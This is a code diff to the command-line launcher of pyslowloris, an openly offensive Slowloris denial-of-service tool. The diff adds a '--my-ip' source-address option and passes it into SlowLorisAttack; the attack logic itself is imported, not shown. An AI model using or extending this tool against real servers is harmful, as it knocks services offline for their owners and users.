@@ -25,6 +25,7 @@ import argparse
 import sys
 
 from pyslowloris import HostAddress, SlowLorisAttack
+from pyslowloris import exceptions as exc
 
 
 def _parse_args() -> dict:
@@ -44,6 +45,10 @@ def _parse_args() -> dict:
     parser.add_argument(
         "-s", "--silent", action='store_true',
         help="Ignore all of the errors [pure attack mode] - bool"
+    )
+    parser.add_argument(
+        "-m", "--my-ip", action="store", type=str,
+        help="Use source IP - str"
     )
 
     # TODO(mkrivich): add support of this flag
@@ -70,16 +75,18 @@ def _parse_args() -> dict:
         sys.exit(-1)
     result["connections_count"] = args.connection_count
     result["silent"] = args.silent
+    result["my_ip"] = args.my_ip
 
     return result
 
 
-def _run(target: HostAddress, connections_count: int, silent: bool) -> None:
+def _run(target: HostAddress, connections_count: int, silent: bool, my_ip: str) -> None:
     print("Attack info:")
     print(f"\tTarget: {str(target)}({target.ip_address})")
     print(f"\tConnection count: {connections_count}")
     print(f"\tMode (silent): {silent}")
-    loris = SlowLorisAttack(target, connections_count, silent=silent)
+    print(f"\tMy IP: {my_ip}")
+    loris = SlowLorisAttack(target, connections_count, silent=silent, my_ip=my_ip)
     loris.start()
 
 
@@ -87,7 +94,7 @@ def main():
     args = _parse_args()
     # Sending requests until Ctrl+C is pressed
     try:
-        _run(args["address"], args["connections_count"], args["silent"])
+        _run(args["address"], args["connections_count"], args["silent"], args["my_ip"])
     except KeyboardInterrupt:
         sys.exit(0)
     except Exception as ex:
